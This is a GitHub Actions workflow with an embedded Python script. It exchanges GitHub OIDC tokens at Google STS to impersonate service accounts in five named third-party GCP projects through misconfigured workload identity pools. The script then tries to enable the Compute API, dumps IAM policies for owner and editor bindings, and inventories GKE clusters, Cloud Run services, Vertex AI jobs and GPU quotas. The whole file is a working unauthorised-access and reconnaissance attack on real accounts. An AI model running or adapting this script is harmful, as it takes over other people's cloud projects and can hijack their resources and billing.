name: i38493-probe3
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - name: probe
        run: |
          cat > /tmp/p.py <<'PYPROBE'
          import base64, json, os, subprocess, urllib.error, urllib.parse, urllib.request, time

          CASES = [
           {"num":"832472850572","proj":"deployment-test-345514",
            "p":"projects/832472850572/locations/global/workloadIdentityPools/my-pool/providers/my-provider",
            "sas":["wip-service-account@deployment-test-345514.iam.gserviceaccount.com"]},
           {"num":"671371757704","proj":"dataplatformcolgate",
            "p":"projects/671371757704/locations/global/workloadIdentityPools/githubactions/providers/github",
            "sas":["github-actions@dataplatformcolgate.iam.gserviceaccount.com"]},
           {"num":"52991355109","proj":"lab-gke-se",
            "p":"projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider",
            "sas":["sa-tenant-gke@lab-gke-se.iam.gserviceaccount.com"]},
           {"num":"147015144729","proj":"docrot-detector",
            "p":"projects/147015144729/locations/global/workloadIdentityPools/github-oidc-pool/providers/github-provider",
            "sas":["docrot-github-action@docrot-detector.iam.gserviceaccount.com"]},
           {"num":"173159973736","proj":"cloud-final-346107",
            "p":"projects/173159973736/locations/global/workloadIdentityPools/cloud-final-pool/providers/github-provider",
            "sas":["gke-account@cloud-final-346107.iam.gserviceaccount.com"]},
          ]
          LOCS = ["us-central1","europe-west1","us-east4","asia-southeast1"]


          def req(u, data=None, token=None, timeout=30):
              h = {'Accept':'application/json','Content-Type':'application/json','User-Agent':'i38493-probe3'}
              if token:
                  h['Authorization'] = 'Bearer ' + token
              if isinstance(data, (dict, list)):
                  data = json.dumps(data).encode()
              r = urllib.request.Request(u, data=data, headers=h)
              try:
                  resp = urllib.request.urlopen(r, timeout=timeout)
                  return resp.status, resp.read().decode('utf-8','replace')
              except urllib.error.HTTPError as e:
                  return e.code, (e.read() or b'').decode('utf-8','replace')
              except Exception as e:
                  return -1, repr(e)[:200]


          def errmsg(st, body, n=210):
              try:
                  j = json.loads(body); e = j.get('error') or {}
                  m = e.get('message') or ''; s = e.get('status') or ''
                  return ('%s: %s' % (s, m))[:n]
              except Exception:
                  return ('HTTP%d: %s' % (st, str(body)[:n]))[:n]


          def mint(aud):
              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
              if not u or not t:
                  return ''
              u = u + ('&' if '?' in u else '?') + 'audience=' + urllib.parse.quote(aud, safe='')
              out = subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,u], capture_output=True, text=True).stdout
              try:
                  return json.loads(out).get('value','')
              except Exception:
                  return ''


          def sts(p):
              body = {'audience':'//iam.googleapis.com/'+p,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
                      'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
                      'scope':'https://www.googleapis.com/auth/cloud-platform',
                      'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':mint('//iam.googleapis.com/'+p)}
              st, rb = req('https://sts.googleapis.com/v1/token', data=body)
              if st != 200:
                  return None, errmsg(st, rb)
              try:
                  return json.loads(rb).get('access_token'), None
              except Exception:
                  return None, 'bad json'


          def gen(tok, sa):
              u = 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe='')
              st, b = req(u, data={'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}, token=tok)
              if st == 200:
                  try:
                      j = json.loads(b); return j.get('accessToken'), j.get('expireTime'), None
                  except Exception:
                      return None, None, 'bad json'
              return None, None, errmsg(st, b)


          def main():
              t0 = time.time()
              print('START', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), flush=True)
              for c in CASES:
                  num = c['num']; pid = c['proj']
                  fed, err = sts(c['p'])
                  rec = {'kind':'final','proj':pid,'num':num,'sts': 200 if fed else 'ERR'}
                  if not fed:
                      rec['sts_err'] = err
                      print('RESULT '+json.dumps(rec), flush=True)
                      continue
                  at = None; expire = None
                  for sa in c['sas']:
                      at, expire, gerr = gen(fed, sa)
                      rec['sa'] = sa
                      if at:
                          rec['expire'] = expire
                          break
                      rec['gen_err'] = gerr
                  if not at:
                      print('RESULT '+json.dumps(rec), flush=True)
                      continue
                  # 1. compute enable attempt (fresh verdict)
                  st, b = req('https://serviceusage.googleapis.com/v1/projects/%s/services/compute.googleapis.com:enable' % num,
                              data={}, token=at)
                  rec['compute_enable'] = {'h': st, 'e': errmsg(st, b) if st != 200 else (b[:180])}
                  # 2. service state re-read
                  st, b = req('https://serviceusage.googleapis.com/v1/projects/%s/services/compute.googleapis.com' % num, token=at)
                  rec['compute_state'] = {'h': st, 'state': (json.loads(b).get('state') if st == 200 else errmsg(st, b, 120))}
                  # 3. SA IAM policy with project ID string (workloadIdentityUser binding evidence)
                  sa = rec['sa']
                  u = 'https://iam.googleapis.com/v1/projects/%s/serviceAccounts/%s:getIamPolicy' % (pid, urllib.parse.quote(sa, safe=''))
                  st, b = req(u, data={'options':{'requestedPolicyVersion':3}}, token=at)
                  r3 = {'h': st}
                  if st == 200:
                      try:
                          j = json.loads(b)
                          r3['bindings'] = [{'role': x.get('role'), 'members': (x.get('members') or [])[:8],
                                             'cond': (x.get('condition') or {}).get('expression') if x.get('condition') else None}
                                            for x in (j.get('bindings') or [])][:15]
                          r3['n'] = len(j.get('bindings') or [])
                      except Exception:
                          r3['body'] = b[:300]
                  else:
                      r3['e'] = errmsg(st, b)
                  rec['sa_iampol_byid'] = r3
                  # 4. full project IAM dump filtered to our SA / owner / editor / workloadIdentity
                  st, b = req('https://cloudresourcemanager.googleapis.com/v1/projects/%s:getIamPolicy' % num,
                              data={'options':{'requestedPolicyVersion':3}}, token=at)
                  if st == 200:
                      try:
                          j = json.loads(b)
                          sel = []
                          for x in (j.get('bindings') or []):
                              role = x.get('role') or ''; mem = x.get('members') or []
                              if ('owner' in role or 'editor' in role or 'workloadIdentity' in role or
                                  any(sa in m for m in mem) or any('principal' in m for m in mem)):
                                  sel.append({'role': role, 'members': mem[:8]})
                          rec['proj_iampol'] = {'h': 200, 'n': len(j.get('bindings') or []), 'sel': sel[:30]}
                      except Exception:
                          rec['proj_iampol'] = {'h': 200, 'body': b[:200]}
                  else:
                      rec['proj_iampol'] = {'h': st, 'e': errmsg(st, b)}
                  # 5. pre-existing GPU-bearing resources
                  gke = {}
                  for loc in LOCS:
                      st, b = req('https://container.googleapis.com/v1/projects/%s/locations/%s/clusters' % (pid, loc), token=at)
                      if st == 200:
                          try:
                              cl = json.loads(b).get('clusters') or []
                              gke[loc] = [{'name': x.get('name'), 'status': x.get('status'),
                                           'nodePools': [p.get('name') for p in (x.get('nodePools') or [])],
                                           'accel': [p.get('config',{}).get('accelerators') for p in (x.get('nodePools') or [])]} for x in cl][:10]
                          except Exception:
                              gke[loc] = 'parse'
                      else:
                          gke[loc] = 'h%d %s' % (st, errmsg(st, b, 90))
                  rec['gke'] = gke
                  run = {}
                  for loc in LOCS:
                      st, b = req('https://run.googleapis.com/v2/projects/%s/locations/%s/services' % (pid, loc), token=at)
                      if st == 200:
                          try:
                              svcs = json.loads(b).get('services') or []
                              run[loc] = [{'name': x.get('name','').split('/')[-1],
                                           'gpu': bool(((x.get('template') or {}).get('containers') or [{}])[0].get('resources',{}).get('limits',{}).get('nvidia.com/gpu'))} for x in svcs][:10]
                          except Exception:
                              run[loc] = 'parse'
                      else:
                          run[loc] = 'h%d %s' % (st, errmsg(st, b, 90))
                  rec['run_services'] = run
                  vtx = {}
                  for loc in LOCS[:2]:
                      st, b = req('https://aiplatform.googleapis.com/v1/projects/%s/locations/%s/endpoints' % (pid, loc), token=at)
                      e1 = ('n=%d' % len(json.loads(b).get('endpoints') or [])) if st == 200 else 'h%d %s' % (st, errmsg(st, b, 90))
                      st2, b2 = req('https://aiplatform.googleapis.com/v1/projects/%s/locations/%s/customJobs' % (pid, loc), token=at)
                      e2 = ('n=%d' % len(json.loads(b2).get('customJobs') or [])) if st2 == 200 else 'h%d %s' % (st2, errmsg(st2, b2, 90))
                      vtx[loc] = {'endpoints': e1, 'customJobs': e2}
                  rec['vertex'] = vtx
                  # 6. cloud quotas by project ID
                  q = {}
                  for loc in ('global','us-central1','europe-west1'):
                      u = ('https://cloudquotas.googleapis.com/v1/projects/%s/locations/%s/services/compute.googleapis.com/quotaInfos?pageSize=300' % (pid, loc))
                      st, b = req(u, token=at)
                      if st == 200:
                          try:
                              j = json.loads(b); gpu = {}
                              for x in (j.get('quotaInfos') or []):
                                  qid = x.get('quotaId','')
                                  if 'GPU' in qid.upper():
                                      gpu[qid] = {'limit': x.get('quotaValue'), 'metric': x.get('metric')}
                              q[loc] = {'h': 200, 'n': len(j.get('quotaInfos') or []), 'gpu': gpu}
                          except Exception:
                              q[loc] = 'parse'
                      else:
                          q[loc] = 'h%d %s' % (st, errmsg(st, b, 90))
                  rec['quota'] = q
                  rec['t'] = round(time.time()-t0,1)
                  print('RESULT '+json.dumps(rec), flush=True)
              print('DONE', round(time.time()-t0,1), flush=True)


          main()
          PYPROBE
          python3 -u /tmp/p.py
